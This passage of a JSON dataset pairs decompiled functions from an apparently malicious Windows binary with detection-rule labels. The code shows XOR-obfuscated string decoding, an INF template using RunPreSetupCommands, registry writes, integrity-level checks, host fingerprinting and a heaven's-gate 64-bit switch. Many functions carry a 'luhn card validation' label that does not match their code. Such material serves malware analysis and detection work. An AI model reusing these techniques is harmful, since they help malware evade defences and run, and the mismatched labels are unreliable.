(*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_30h = &var_58h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar8 != 0x322787) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.004087c4();\n    }\n    var_58h = 0x75416471;\n    var_54h = 0x46616b00;\n    var_50h = 0x667e1a7a;\n    var_4ch._0_2_ = 0x7447;\n    var_4ch._2_1_ = 0xe;\n    var_4ch._3_1_ = 0x73;\n    var_48h = 0x5867;\n    var_46h = 0x7f;\n    var_45h = 0x41637005;\n    var_41h._0_1_ = 0x4d;\n    var_3ch = 0x4d755246;\n    var_38h._0_1_ = 0x37;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_58h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar8 != 0x32e1f5) {\n            *(iVar7 + iVar6) = *(&var_3ch + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    iVar7 = var_78h;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.004087c4();\n    }\n    uVar5 = (*pcVar2)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_28h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_cch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_2ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar10 = (*pcVar1)(uVar5);\n    return uVar10 & 0xffffff00;\n}\n",
        "token_count": 9219
    },
    "0040aa0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040aa0e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040a8cb(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.00409e62(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.0040bdde(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 580
    },
    "00410000": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00410000(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.00410055(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 183
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    // [00] -r-x section size 65536 named .text\n    uVar11 = 0;\n    piVar5 = fcn.0040b12e();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 822
    },
    "0040110c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040110c(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint Reserved;\n    uint var_c0h;\n    int16_t *lpData;\n    int16_t *var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    int32_t var_51h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t lpValueName;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    Reserved = 1;\n    var_28h = 0x49137326;\n    var_24h = 0x76126223;\n    var_20h = 0x730e453c;\n    var_1ch = 0x620c4902;\n    var_18h = 0x453a761d;\n    var_14h = 0x49177316;\n    var_10h = 0x761f6229;\n    var_ch._0_1_ = 0x49;\n    var_ch._1_1_ = 0x45;\n    var_48h = 0x49767362;\n    var_44h._0_1_ = 0x45;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_b4h = 5;\n    var_c0h = 0;\n    iVar8 = 0;\n    var_b8h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar5 != 0x8b48c5) {\n            *(iVar8 + piVar4) = *(&var_48h + iVar8 % var_b4h) ^ (iVar8 + piVar4)[&var_28h - piVar4];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    var_b0h = 0x672b4438;\n    var_ach = 0x44306b27;\n    var_a8h = 0x440a4110;\n    var_a4h = 0x6b246736;\n    var_a0h = 0x412a4418;\n    var_9ch = 0x67274402;\n    var_98h = 0x442b6b33;\n    var_94h = 0x44044114;\n    var_90h = 0x6b356722;\n    var_8ch = 0x412e4418;\n    var_88h._0_2_ = 0x442e;\n    var_88h._2_1_ = 5;\n    stack0xffffff77 = 0x186b0a67;\n    var_81h = 0x19412044;\n    var_7dh = 0x34672b44;\n    var_79h = 0x3744346b;\n    var_75h = 0x28440441;\n    var_71h = 0x276b2867;\n    var_6dh = 0x37411e44;\n    var_69h = 0x24671444;\n    var_65h = 0x3442a6b;\n    var_61h = 0x2a440241;\n    var_5dh = 0x36b2667;\n    var_59h = 0x24413744;\n    var_55h = 0x41673744;\n    var_51h._0_1_ = 0x6b;\n    var_8h = 0x6744446b;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x41);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_48h = iVar8;\n    lpValueName = &var_b0h - iVar8;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0xc31797) {\n            *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_b4h) ^ (iVar5 + iVar8)[&var_b0h - iVar8];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    *NULL = fcn.0040cee7(0x20006);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*NULL != 0) {\n        var_40h = 0x4c0e3471;\n        var_3ch = 0x345c4e44;\n        var_38h = 0x4e314c15;\n        var_8h = 0x4c613432;\n        var_4h._0_2_ = 0x4e31;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_30h = 6;\n        iVar5 = 0;\n        var_4ch = &var_40h - iVar8;\n        lpValueName = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar6 != 0xe2a2b8) {\n                *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_30h) ^ (iVar5 + iVar8)[&var_40h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_18h = 0x530f323c;\n        var_14h = 0x32045a16;\n        var_10h = 0x5a62535f;\n        var_3ch = 0x536e326c;\n        var_38h = CONCAT22(var_38h._2_2_, 0x5a62);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_4ch = &var_18h - iVar8;\n        var_8h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n            if (iVar6 != 0xe7f253) {\n                *(iVar5 + iVar8) = *(&var_3ch + iVar5 % var_30h) ^ (iVar5 + iVar8)[&var_18h - iVar8];\n            }\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_1ch = 0x6f375163;\n        var_18h = 0x5225300b;\n        var_14h = 0x515f6806;\n        var_10h = 0x30596f3c;\n        var_ch._0_1_ = 0x51;\n        var_ch._1_1_ = 0x52;\n        var_30h = 0x6f525130;\n        var_2ch._0_1_ = 0x68;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_4ch = &var_1ch - iVar8;\n        do {\n            iVar6 = (*pcVar7)();\n            if (iVar6 != 0xb1036c) {\n                *(iVar5 + iVar8) = *(&var_30h + iVar5 % var_b4h) ^ (iVar5 + iVar8)[var_4ch];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(stack0xffffffac, lpValueName, 0, 4, &Reserved, 4);\n        iVar5 = var_8h;\n        piVar4 = lpData;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_c0h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(stack0xffffffac, var_8h, 0, 1, lpData, (piVar4 - (lpData + 1) >> 1) * 2)\n        ;\n        var_8h = var_b8h + 1;\n        piVar4 = var_b8h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_c0h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(stack0xffffffac, iVar8, 0, 1, var_b8h, (piVar4 - var_8h >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(stack0xffffffac);\n        uVar3 = (*pcVar7)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, iVar5);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar7)(0, lpValueName);\n        (*pcVar2)(uVar3);\n        iVar8 = var_48h;\n    }\n    piVar4 = var_b8h;\n    uVar3 = (*pcVar7)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 2662
    },
    "00401ed5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00401ed5(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 268
    },
    "00404523": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00404523(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 129
    },
    "00404549": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00404549(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 108
    },
    "00404563": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404563(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4114d4;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4114d4;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 420
    },
    "004045d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004045d6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41199c;\n    uStack104 = *0x411998;\n    uStack108 = *0x411994;\n    name = *0x411990;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41daf0;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x4119a0;\n    uStack92 = *0x4119a4;\n    uStack88 = *0x4119a8;\n    uStack84 = *0x4119ac;\n    var_3ch = *0x411980;\n    uStack60 = *0x411984;\n    uStack56 = *0x411988;\n    uStack52 = *0x41198c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41daf8 = uVar10 ^ uVar8;\n        *0x41dafc = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41daf0 = uVar8;\n        *0x41daf4 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1699
    },
    "00404b5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404b5d(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 521
    },
    "00404c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
